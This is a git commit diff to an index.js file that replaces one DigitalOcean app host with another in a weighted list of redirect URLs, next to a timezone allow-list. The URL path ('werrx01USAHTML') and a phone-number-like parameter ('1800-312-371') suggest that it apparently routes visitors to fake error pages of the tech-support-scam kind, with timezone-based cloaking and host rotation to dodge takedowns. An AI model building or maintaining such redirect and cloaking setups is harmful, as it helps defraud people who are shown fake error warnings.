45c661858566484c2fd3d27bb7c739eda1263246
paalakash <palaksh452@gmail.com>
2026-06-11 05:05:59 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://coral-app-tjc9w.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 },
-    { url: "https://coral-app-tjc9w.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 }
+    { url: "https://stingray-app-smott.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 },
+    { url: "https://stingray-app-smott.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 }
 
 ];
 
